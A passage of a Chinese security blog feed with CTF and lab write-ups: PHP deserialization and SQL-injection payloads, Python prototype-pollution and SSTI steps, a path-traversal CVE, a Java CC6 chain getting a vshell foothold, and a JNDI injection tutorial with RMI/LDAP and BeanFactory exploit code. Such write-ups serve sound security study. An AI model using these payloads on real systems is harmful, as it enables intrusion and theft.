class="variable">$Bagongren</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HongCaFei</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">GoGOGO</span>();</span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">HeiCaFei</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;dengchao=<span class="keyword">new</span> <span class="title class_">DouBao</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;dengchao-&gt;Dagongren=[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>-&gt;dengchao-&gt;Bagongren=[<span class="string">&#x27;0&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>-&gt;dengchao-&gt;dao=[<span class="variable">$h</span>,<span class="string">&#x27;ls /&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp，这里主要难点是call_user_func_array第二个参数给我们确定了，我们可以像第一个参数传入一个数组，这样就能够忽滤掉第二个参数，从而执行命令</p>
<p><img src="/posts/6e605e05/1749460561820-438b1dc5-df0e-448f-8331-e9d4710674c9.png" alt="img"></p>
<h2 id="半成品login"><a href="#半成品login" class="headerlink" title="半成品login"></a>半成品login</h2><p><img src="/posts/6e605e05/1749460697580-52f6067a-be72-476f-b98d-361ba0f79b48.png" alt="img"></p>
<p>弱密码</p>
<p><img src="/posts/6e605e05/1749460942173-15eda2a3-3879-496b-a28c-09cf23b4af9f.png" alt="img"></p>
<p>sql注入，要拿到flag</p>
<p>既然放在了hacker*****下，我们就尝试登陆，</p>
<p>需要的sql语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * where username=<span class="string">&#x27;hacker&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> username like <span class="string">&#x27;hacker%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>首先，and的优先级时比or大的，只要or的前者不满足条件就会选中后者，后者用%进行一个模糊搜索（只要时hacker开头的会被选中），因此可直接登录进，无需密码</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=hacker&amp;password=<span class="number">1</span><span class="string">&#x27; || username like&#x27;</span>hacker%<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/6e605e05/1749462208129-1d4caaa2-beb7-470a-84c8-ba8e59ab10fb.png" alt="img"></p>
<p>这里payload空格和引号被过滤了，空格使用，&#x2F;**&#x2F;绕过，或者使用%a0应该也可以，引号使用两次url编码</p>
<h2 id="DeceptiFlag"><a href="#DeceptiFlag" class="headerlink" title="DeceptiFlag"></a>DeceptiFlag</h2><p><img src="/posts/6e605e05/1749463288187-c7d07a52-de9f-4348-af6e-ca9b4fb5694d.png" alt="img"></p>
<p>这边有一个隐藏的输入框，可以删掉，按钮有个判定的重定向，</p>
<p>一个是xiyangyang，一个是huitailang</p>
<p><img src="/posts/6e605e05/1749463498095-91c572f3-78b2-4329-a548-1fc7d59ead86.png" alt="img"></p>
<p>flag.php下是假的的flag，看一下环境变量是&#x2F;proc&#x2F;1&#x2F;environ</p>
<p><img src="/posts/6e605e05/1749463571809-262a3d4e-fd31-4b87-a186-0823d4267b0e.png" alt="img"></p>
<h2 id="奇怪的咖啡店"><a href="#奇怪的咖啡店" class="headerlink" title="奇怪的咖啡店"></a>奇怪的咖啡店</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><img src="/posts/6e605e05/1749468382119-0aef76f9-539a-414f-8d78-b38704765569.png" alt="img"></p>
<p>很明显的python原型链的污染</p>
<p><img src="/posts/6e605e05/1749468453605-6291b260-8f44-4ddf-ad00-5f84247bcce9.png" alt="img"></p>
<p>这时候我们可以污染静态文件，实现任意文件读取</p>
<p>{“<strong>init</strong>“:{“<strong>globals</strong>“:{“app”:{“_static_folder”: “&#x2F;“}}}}</p>
<p>当然__init__是类实例的属性，这题不需要(这题是函数对象)，只能直接用__globals__（不影响）</p>
<p>{“<strong>globals</strong>“:{“app”:{“_static_folder”: “&#x2F;“}}}</p>
<p>{“\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f”: {“\u0061\u0070\u0070”: {“\u005f\u0073\u0074\u0061\u0074\u0069\u0063\u005f\u0066\u006f\u006c\u0064\u0065\u0072”: “\u002f”}}}</p>
<p>访问&#x2F;proc&#x2F;1&#x2F;environ</p>
<p><img src="/posts/6e605e05/1749471997092-9be65917-d6e6-4103-a757-90eadefc08cd.png" alt="img"></p>
<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>先利用上述污染掉static</p>
<p>在读取app.py完整文件</p>
<p><img src="/posts/6e605e05/1749474291680-9c7d585e-b15a-4bf6-9d33-de1b685a559b.png" alt="img"></p>
<p>这边是要打ssti</p>
<p>污染key</p>
<p><img src="/posts/6e605e05/1749474630907-0335dc88-dc94-4160-95b3-140052813ee6.png" alt="img"></p>
<p>{“<strong>globals</strong>“: {“app”: {“config”: {“SECRET_KEY”: “123”}}}}</p>
<p>{“\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f”: {“\u0061\u0070\u0070”: {“\u0063\u006f\u006e\u0066\u0069\u0067”: {“\u0053\u0045\u0043\u0052\u0045\u0054\u005f\u004b\u0045\u0059”: “123”}}}}</p>
<p>再污染掉</p>
<p> {“<strong>globals</strong>“ : {“param_black_list” : [“123”]}}  </p>
<p>{“\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f” :{“\u0070\u0061\u0072\u0061\u006d\u005f\u0062\u006c\u0061\u0063\u006b\u005f\u006c\u0069\u0073\u0074” : [“123”]}}  </p>
<p>然后构造session</p>
<p><img src="/posts/6e605e05/1749483009165-017c4980-aca2-4fe5-932b-1b1f60e7e966.png" alt="img"></p>
<p>命令执行成功</p>
<p><img src="/posts/6e605e05/1749483033962-44b7858f-4203-45f0-b215-8f4ca33021f4.png" alt="img"></p>
<p><img src="/posts/6e605e05/1749483243848-af23700f-eaf0-4dc3-856a-eed5e00e4c55.png" alt="img"></p>
<h2 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h2><p><img src="/posts/6e605e05/1749547175837-3a961772-5e6f-4353-a012-c84f47953e34.png" alt="img"></p>
<p>我们进入环境之后，是一个文件读取，可以读取任意文件，但是不能直接进行目录穿越读取D盘里的内容</p>
<p><img src="/posts/6e605e05/1749547468243-1f380c27-9980-46ff-b1c7-0ccb97179e0d.png" alt="img"></p>
<p>然后解决办法就是使用， CVE-2023-45283  ，一个cve漏洞，??\C:会被解析为C:从而达到绕过安全检测</p>
<p><img src="/posts/6e605e05/1749547579796-cf336eee-d771-4e1b-8714-7c252d1b3bb7.png" alt="img"></p>
<p>拿到key</p>
<p><img src="/posts/6e605e05/1749547596322-27cc4514-8607-4b08-8f2d-c9fc72ed0f92.png" alt="img"></p>
<p>得到flag</p>
<p><img src="/posts/6e605e05/1749547617390-4b51091f-aaf0-4a09-af17-0500a26a8996.png" alt="img"></p>
<p>两个re+web波煮是真不会re</p>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
  </entry>
  <entry>
    <title>Javacc</title>
    <url>/posts/26798085/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶场是从极核开的，<a href="https://hackhub.get-shell.com/">https://hackhub.get-shell.com/</a></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/posts/26798085/20251225102747106.png" alt="image.png"><br>一个登录系统，弱密码爆破一下<br><img src="/posts/26798085/20251225103024099.png" alt="image.png"></p>
<p>账号，密码分别是admin,admin123<br><img src="/posts/26798085/20251225103135541.png" alt="image.png"></p>
<p>看Cookie这里明显的反序列化字符串，<code>rO0AB</code><br>使用工具JavaGadgetGenerator进行cc链的测试<br><img src="/posts/26798085/20251225103544919.png" alt="image.png"><br>设置好响应时间，我们来生成对应的链子，开始测试<br><img src="/posts/26798085/20251225103804194.png" alt="image.png"><br>当我们测试到cc6的时候就有明显的延迟，我们在使用DNS测试一下<br><img src="/posts/26798085/20251225103925106.png" alt="image.png"><br><img src="/posts/26798085/20251225103954607.png" alt="image.png"><br>有响应，这也确认了是cc6，同时也可以出网，那我们使用vshell来getshell<br>启动vshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohup ./v_linux_amd64 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/26798085/20251225111031707.png" alt="image.png"><br>使用上线命令<br><img src="/posts/26798085/20251225111116238.png" alt="image.png"></p>
<p><img src="/posts/26798085/20251225111157799.png" alt="image.png"><br>上线成功<br><img src="/posts/26798085/20251225111626826.png" alt="image.png"></p>
<p>学了个vshell的使用，不赖</p>
]]></content>
      <categories>
        <category>src</category>
        <category>打靶</category>
      </categories>
  </entry>
  <entry>
    <title>JNDI注入</title>
    <url>/posts/50c249a4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始JNDI的学习,一定要多敲敲代码啊(对自己说)<br>官方文档地址:<a href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">课程：JNDI（Java™ 命名与目录接口&gt;教程）概述</a></p>
<h1 id="JNDI概念"><a href="#JNDI概念" class="headerlink" title="JNDI概念"></a>JNDI概念</h1><p>JNDI是java命名与目录接口,一个名字对应一个java对象,也就是说一个字符串对应一个Java对象.<br>JNDI在jdk里面支持一下服务:</p>
<ul>
<li>LDAP:轻量级目录访问协议</li>
<li>通用对象请求代理架构(CORBA)；通用对象服务(COS)名称服务</li>
<li>java远程调用(RMI)注册表</li>
<li>DNS服务</li>
</ul>
<h1 id="JNDI的利用方式与漏洞"><a href="#JNDI的利用方式与漏洞" class="headerlink" title="JNDI的利用方式与漏洞"></a>JNDI的利用方式与漏洞</h1><h2 id="JNDI在RMI中的利用"><a href="#JNDI在RMI中的利用" class="headerlink" title="JNDI在RMI中的利用"></a>JNDI在RMI中的利用</h2><p>RMI服务端的接口类和实现类,和之前一样就可以.<br>重点改变的是使用JDNI的方式去绑定远程对象到注册中心,以及使用JDNI的方式去调用这个远程对象.</p>
<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.InitialContext;  </span><br><span class="line">import javax.naming.NamingException;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line">public class JNDIRMIserver &#123;  </span><br><span class="line">    public static void main(String[] args) throws NamingException, RemoteException &#123;  </span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);  </span><br><span class="line">  </span><br><span class="line">        InitialContext initialContext = new InitialContext();  </span><br><span class="line">        initialContext.rebind(&quot;rmi://localhost:1099/remoteobject&quot;, new remoteObject());  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.InitialContext;  </span><br><span class="line">import javax.naming.NamingException;  </span><br><span class="line">  </span><br><span class="line">public class JNDIRMIclient &#123;  </span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;  </span><br><span class="line">        InitialContext initialContext = new InitialContext();  </span><br><span class="line">        IremoteObject lookup = (IremoteObject) initialContext.lookup(&quot;rmi://localhost:1099/remoteobject&quot;);  </span><br><span class="line">        System.out.println(lookup.sayHello(&quot;Li&quot;));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="RMI的原生漏洞"><a href="#RMI的原生漏洞" class="headerlink" title="RMI的原生漏洞"></a>RMI的原生漏洞</h2><p><img src="/posts/50c249a4/20260106150555468.png" alt="image.png"><br>这里去查询一个RMI服务(这个服务是我们可以利用的),如果这个服务是恶意的服务,那就会产生漏洞.<br>但是这个服务呢,它不是传统的JNDI注入漏洞(利用的是引用对象),它是一个RMI的原生漏洞(远程对象)(我们之前分析的)<br>具体可见:<br><img src="/posts/50c249a4/20260106151146993.png" alt="image.png"><br>我们在客户端下断点一直不如lookup,来看看会调用到哪里,也就是图上所述的RegistryContext<br><img src="/posts/50c249a4/20260106151436537.png" alt="image.png"><br>这里也就很明显了,调用的就是原生RMI的lookup</p>
<h2 id="传统JNDI注入（结合RMI）"><a href="#传统JNDI注入（结合RMI）" class="headerlink" title="传统JNDI注入（结合RMI）"></a>传统JNDI注入（结合RMI）</h2><p><img src="/posts/50c249a4/20260106151925929.png" alt="image.png"><br>这以上是可储存在目录中的对象,而刚刚分析的RMI就是远程对象的一种.但是传统的JNDI注入是指可引用的对象.<br>引用对象的作用:主要就是进行一个封装,就比如我们要绑定一个自己的对象,但是我们的这个对象不满足以上5种的格式,这时候就需要利用引用对象使其满足.</p>
<p><img src="/posts/50c249a4/20260106154520716.png" alt="image.png"><br>这个具体的实现逻辑就是他会在工厂里面写一些代码逻辑,就在你查询或者调用它的时候就会执行这些代码逻辑.因为工厂的位置是我们可以控制的,所以传递一些恶意工厂的位置就会执行恶意的代码.</p>
<p>那么这时候我们就可以这样写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.InitialContext;  </span><br><span class="line">import javax.naming.NamingException;  </span><br><span class="line">import javax.naming.Reference;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line">public class JNDIRMIserver &#123;  </span><br><span class="line">    public static void main(String[] args) throws NamingException, RemoteException &#123;  </span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);  </span><br><span class="line">  </span><br><span class="line">        InitialContext initialContext = new InitialContext();  </span><br><span class="line">//        initialContext.rebind(&quot;rmi://localhost:1099/remoteobject&quot;, new remoteObject());  </span><br><span class="line">        Reference reference = new Reference(&quot;TestRef&quot;,&quot;TestRef&quot;,&quot;http://localhost:7777/&quot;);  </span><br><span class="line">        initialContext.rebind(&quot;rmi://localhost:1099/remoteobject&quot;, reference);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们使用的TestRef类的内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;  </span><br><span class="line">import javax.naming.Name;  </span><br><span class="line">import javax.naming.spi.ObjectFactory;  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">import java.util.Hashtable;  </span><br><span class="line">  </span><br><span class="line">// 1. 必须实现 ObjectFactory 接口  </span><br><span class="line">public class TestRef implements ObjectFactory &#123;  </span><br><span class="line">  </span><br><span class="line">    public TestRef() throws IOException &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    // 2. 必须重写这个方法，否则会因为不是抽象类且未实现方法而编译报错  </span><br><span class="line">    @Override  </span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;  </span><br><span class="line">        return null; // 这里返回什么不重要，重点是接口类型要匹配  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>来执行恶意命令<br><img src="/posts/50c249a4/20260106160310645.png" alt="image.png"></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>打断点调试到rmi原生调用的点,这里获取的是rmi上的ReferenceWrapper_stub对象<br><img src="/posts/50c249a4/20260106162320758.png" alt="image.png"><br>但是我们绑定的时候绑定的是一个reference对象,那么查的时候怎么就变了呢?我们就回头来看一下,bind的逻辑.</p>
<p><img src="/posts/50c249a4/20260106162903240.png" alt="image.png"><br>依旧是到绑定的地方,这里绑定的名字是没有改变的,但是对象被encodeObject了</p>
<p><img src="/posts/50c249a4/20260106163111699.png" alt="image.png"><br>这里的如果对象是reference的话,那就会封装为referenceWrapper</p>
<p>在回到客户端继续走<br><img src="/posts/50c249a4/20260106165310382.png" alt="image.png"><br>这里有一个decodeObject正好和前面的encode对应上了.</p>
<p><img src="/posts/50c249a4/20260106165541316.png" alt="image.png"><br>这里就是如果是referenceWrapper类就会变成reference,也就是我们刚开始传的.然后这里调用getObjectInstance这个方法,这里是一个静态的方法,到这里还没有进入到命令执行的方法里,所以具体的执行点是在这个静态的方法或者在向里,那么具体的执行就和容器无关了.也就是不只有RMI会出现这种漏洞.</p>
<p><img src="/posts/50c249a4/20260106170525261.png" alt="image.png"><br>然后到这边,从名字就可以看到,它的意思是从引用里获取工厂,步入</p>
<p><img src="/posts/50c249a4/20260106170643861.png" alt="image.png"><br>到这里就开始进行一个类加载</p>
<p>接着是进行一个本地的去寻找TestRef类，一般在本地是不会找到这个类的，所以不要将这个恶意类放到本地，也就是target里，放到外面的文件夹里，开启一个python服务。<br>如果放在本地，第一次肯定是能找到的，就用不到codebase了。但是如果不放本地，就找不到，还是要用到codebase</p>
<p><img src="/posts/50c249a4/20260107141400411.png" alt="image.png"><br>codebase看值也知道要用一个urlclassloader，来加载<br><img src="/posts/50c249a4/20260107141519572.png" alt="image.png"></p>
<p><img src="/posts/50c249a4/20260107141608975.png" alt="image.png"><br>到这里的loadclass，根据urlclassloader的url来找类，进行加载。</p>
<p><img src="/posts/50c249a4/20260107142029870.png" alt="image.png"><br>最后实例化执行</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>前提：攻击者能够篡改rmi服务使其指向一个恶意的rmi服务</p>
<ol>
<li>访问恶意rmi服务，获取到一个恶意的地址（存有恶意对象）</li>
<li>根据地址访问恶意对象</li>
<li>遭受到攻击</li>
</ol>
<h2 id="传统的JNDI注入（结合LDAP）"><a href="#传统的JNDI注入（结合LDAP）" class="headerlink" title="传统的JNDI注入（结合LDAP）"></a>传统的JNDI注入（结合LDAP）</h2><p>LDAP（轻量级目录访问协议）是一种用于访问和维护分布式目录信息服务的应用协议。<br>你可以把LDAP想象成一个专门为“读多写少”场景优化的、层级结构的“电子电话簿”或“企业通讯录”。它主要用于存储用户、计算机和其他资源的信息，并用于认证和授权。</p>
<p>在本地可以使用apache Directory Studio启动一个ldap服务<br><img src="/posts/50c249a4/20260110164442429.png" alt="image.png"></p>
<p>jndi的服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIserver</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;  </span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.createRegistry(1099);  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"><span class="comment">//        initialContext.rebind(&quot;rmi://localhost:1099/remoteobject&quot;, new remoteObject());  </span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);  </span><br><span class="line">        initialContext.rebind(<span class="string">&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;</span>, reference);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将要加载的类的位置填充到ldap的服务中<br><img src="/posts/50c249a4/20260110170137595.png" alt="image.png"></p>
<p>客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIclient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">        <span class="type">IremoteObject</span> <span class="variable">lookup</span> <span class="operator">=</span> (IremoteObject) initialContext.lookup(<span class="string">&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;</span>);  </span><br><span class="line"><span class="comment">//        System.out.println(lookup.sayHello(&quot;Li&quot;));  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/50c249a4/20260110170222303.png" alt="image.png"><br>执行命令加载恶意类并执行命令</p>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>前面的我们就不看了<br><img src="/posts/50c249a4/20260110173658602.png" alt="image.png"><br>调到这里和分析rmi的时候一样使用decodeObject方法获取地址，类名什么的对应服务端的encodeObject了。<br>然后<br><img src="/posts/50c249a4/20260110173926250.png" alt="image.png"><br>我们向这里跟<br><img src="/posts/50c249a4/20260110174122156.png" alt="image.png"><br>从引用里获取工厂，也就是恶意类<br><img src="/posts/50c249a4/20260110174256987.png" alt="image.png"><br>加载恶意类<br><img src="/posts/50c249a4/20260110174322864.png" alt="image.png"><br>实例化，触发</p>
<h2 id="JNDI的高版本绕过方法"><a href="#JNDI的高版本绕过方法" class="headerlink" title="JNDI的高版本绕过方法"></a>JNDI的高版本绕过方法</h2><p>首先是针对RMI的在8u121之后rmi就不能够直接进行利用了。<br>因此，需要使用LDAP进行绕过，也就是从jdk8u121~jdk8u191 都是可以使用LDAP进行绕过的<br>但是jdk8u191之后，由于在类加载的过程中添加了对trustURLCodebase的值是否为true的判断，导致，我们无法直接加载codebase，所以也就无法进行urlclassloader。<br><img src="/posts/50c249a4/20260114151546217.png" alt="image.png"><br>具体的逻辑是在这里</p>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="使用本地Class作为Reference-Factory"><a href="#使用本地Class作为Reference-Factory" class="headerlink" title="使用本地Class作为Reference Factory"></a>使用本地Class作为Reference Factory</h4><p>明确一点现在codebase是不能使用的，也就是不能进行urlclassloder，那么也就是我们写的url（位置）是用不了的，远程的既然用不了，就可以试一下本地的factory类。这个类要实现ObjectFactory这个接口。这里找到的是BeanFactory这个类。<br>依赖包是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;8.5.63&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;tomcat-el-api&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;8.5.63&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;tomcat-jasper-el&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;8.5.63&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
<p>然后就是使用beanfactory绕过的具体方法</p>
<h5 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIserver</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"><span class="comment">//        initialContext.rebind(&quot;rmi://localhost:1099/remoteobject&quot;, new remoteObject());  </span></span><br><span class="line"><span class="comment">//        Reference reference = new Reference(&quot;TestRef&quot;,&quot;TestRef&quot;,&quot;http://localhost:7777/&quot;);  </span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>,<span class="string">&quot;x=eval&quot;</span>));  </span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/RO&quot;</span>, resourceRef);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体解释一下</p>
<ol>
<li><p><code>Registry registry = LocateRegistry.createRegistry(1099);</code>  启动一个注册中心</p>
</li>
<li><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>( <span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="comment">// 1. 目标类名      null, &quot;&quot;, &quot;&quot;,</span></span><br><span class="line"> <span class="literal">true</span>, </span><br><span class="line"> <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="comment">// 2. 工厂类名 </span></span><br><span class="line"> <span class="literal">null</span> )；</span><br></pre></td></tr></table></figure>
<p>这一串代码的目的是：我们想欺骗 <code>BeanFactory</code> 帮我们在客户端本地创建一个 <code>ELProcessor</code> 对象，并执行恶意代码。</p>
</li>
<li><p><code>resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</code> : 如果你看到属性 <code>x</code>，不要去找 <code>setX()</code> 方法，而是强制去调用 <code>eval()</code> 方法</p>
</li>
<li><p><code>resourceRef.add(new StringRefAddr(&quot;x&quot;, &quot;Runtime.getRuntime().exec(&#39;calc&#39;)&quot;));</code> :给x赋上值，符合上述逻辑，在看到x是不会强制调用setx方法，而是会调用eval从而执行elProcessor.eval(“Runtime.getRuntime().exec(‘calc’)”)</p>
</li>
<li><p>最后就是bind<br>  总之，利用的恶意类是ELProcessor，我们使用BeanFactory给它一个属性，并强制更改属性被eval调用，值为恶意命令。</p>
</li>
</ol>
